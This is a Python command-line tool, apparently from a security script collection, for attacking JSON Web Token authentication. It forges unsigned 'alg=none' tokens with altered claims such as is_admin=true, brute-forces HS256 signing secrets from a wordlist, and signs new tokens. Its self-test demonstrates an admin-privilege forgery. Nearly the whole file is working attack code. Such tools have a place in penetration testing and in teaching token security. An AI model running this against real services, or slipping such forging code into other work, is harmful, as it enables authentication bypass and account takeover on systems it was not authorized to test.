#!/usr/bin/env python3
"""
JWT Tool Lite - Lightweight JSON Web Token Analyzer & Security Tester
Part of Cybersecurity Arsenal Scripts
Features:
- Decode header and payload without verifying signature
- Test for Algorithm 'none' attack (CVE-2015-9235 / Bypassing auth)
- Test for HMAC key brute-force using common wordlists
- Craft tampered tokens with custom claims
"""

import sys
import json
import base64
import hmac
import hashlib
import time
import argparse
from typing import Optional, Dict, Any, Tuple

def b64url_decode(payload: str) -> bytes:
    """Decode base64url string with proper padding."""
    rem = len(payload) % 4
    if rem > 0:
        payload += "=" * (4 - rem)
    return base64.urlsafe_b64decode(payload.encode("utf-8"))

def b64url_encode(data: bytes) -> str:
    """Encode bytes into base64url string without padding."""
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")

def parse_jwt(token: str) -> Tuple[Optional[Dict[str, Any]], Optional[Dict[str, Any]], str]:
    """Parse JWT into header dict, payload dict, and signature string."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT format: expected 3 parts, got {len(parts)}")
    
    header = json.loads(b64url_decode(parts[0]).decode("utf-8", errors="ignore"))
    payload = json.loads(b64url_decode(parts[1]).decode("utf-8", errors="ignore"))
    signature = parts[2]
    return header, payload, signature

def dump_token_info(token: str) -> None:
    header, payload, sig = parse_jwt(token)
    print("=" * 60)
    print("                 JWT TOKEN ANALYSIS")
    print("=" * 60)
    print("[Header]:")
    print(json.dumps(header, indent=2))
    print("\n[Payload]:")
    print(json.dumps(payload, indent=2))
    
    if "exp" in payload:
        exp_time = payload["exp"]
        now = int(time.time())
        status = "EXPIRED" if now > exp_time else f"ACTIVE ({exp_time - now}s remaining)"
        print(f"\n[Expiration Status]: {status} (exp={exp_time}, now={now})")
        
    print(f"\n[Signature]: {sig if sig else '(Empty / None)'}")
    print("=" * 60)

def craft_none_algorithm(token: str, override_claims: Optional[Dict[str, Any]] = None) -> str:
    """Craft an algorithm 'none' token for authentication bypass."""
    header, payload, _ = parse_jwt(token)
    header["alg"] = "none"
    if override_claims:
        payload.update(override_claims)
        
    enc_header = b64url_encode(json.dumps(header, separators=(',', ':')).encode("utf-8"))
    enc_payload = b64url_encode(json.dumps(payload, separators=(',', ':')).encode("utf-8"))
    # Two valid formats: 'header.payload.' and 'header.payload'
    forged = f"{enc_header}.{enc_payload}."
    return forged

def craft_hs256_token(header: Dict[str, Any], payload: Dict[str, Any], secret: str) -> str:
    """Sign token with HS256 using given secret."""
    enc_header = b64url_encode(json.dumps(header, separators=(',', ':')).encode("utf-8"))
    enc_payload = b64url_encode(json.dumps(payload, separators=(',', ':')).encode("utf-8"))
    to_sign = f"{enc_header}.{enc_payload}".encode("utf-8")
    sig = hmac.new(secret.encode("utf-8"), to_sign, hashlib.sha256).digest()
    enc_sig = b64url_encode(sig)
    return f"{enc_header}.{enc_payload}.{enc_sig}"

def crack_hs256(token: str, wordlist_path: str) -> Optional[str]:
    """Brute-force HS256 secret using a wordlist."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    header, payload, target_sig = parse_jwt(token)
    if header.get("alg") != "HS256":
        print(f"[!] Warning: Token algorithm is {header.get('alg')}, not HS256.")
        
    to_sign = f"{parts[0]}.{parts[1]}".encode("utf-8")
    target_raw_sig = b64url_decode(target_sig)
    
    print(f"[*] Starting brute force against token using {wordlist_path}...")
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for count, line in enumerate(f, 1):
                secret = line.strip()
                cand_sig = hmac.new(secret.encode("utf-8"), to_sign, hashlib.sha256).digest()
                if hmac.compare_digest(cand_sig, target_raw_sig):
                    print(f"\n[+] SUCCESS! Secret key found after {count} attempts: '{secret}'")
                    return secret
    except Exception as e:
        print(f"[ERROR] Failed reading wordlist: {e}")
        return None
        
    print(f"[-] Key not found in wordlist.")
    return None

def main():
    parser = argparse.ArgumentParser(description="JWT Tool Lite - Security Analyzer")
    subparsers = parser.add_subparsers(dest="command")
    
    # decode
    decode_p = subparsers.add_parser("decode", help="Decode and inspect token")
    decode_p.add_argument("token", help="JWT token string")
    
    # forge-none
    none_p = subparsers.add_parser("forge-none", help="Generate alg=none forged token")
    none_p.add_argument("token", help="Base JWT token string")
    none_p.add_argument("--set", help="Override claims as JSON, e.g. '{\"is_admin\": true}'")
    
    # crack
    crack_p = subparsers.add_parser("crack", help="Brute-force HS256 secret with wordlist")
    crack_p.add_argument("token", help="JWT token string")
    crack_p.add_argument("wordlist", help="Path to password dictionary")
    
    args = parser.parse_args()
    
    if args.command == "decode":
        dump_token_info(args.token)
    elif args.command == "forge-none":
        override = json.loads(args.set) if args.set else None
        forged = craft_none_algorithm(args.token, override)
        print("\n[+] Forged 'none' algorithm token:")
        print(forged)
        dump_token_info(forged)
    elif args.command == "crack":
        crack_hs256(args.token, args.wordlist)
    else:
        # Default self-test demo
        print("[*] Running JWT Tool Lite self-test...")
        demo_header = {"alg": "HS256", "typ": "JWT"}
        demo_payload = {"user_id": 101, "username": "alice", "is_admin": False, "exp": int(time.time()) + 3600}
        demo_token = craft_hs256_token(demo_header, demo_payload, "secret123")
        print(f"[+] Sample Token: {demo_token}")
        dump_token_info(demo_token)
        forged = craft_none_algorithm(demo_token, {"is_admin": True})
        print(f"[+] Forged Token (alg=none, is_admin=True): {forged}")
        print("\n[SUCCESS] Self-test completed.")

if __name__ == "__main__":
    main()
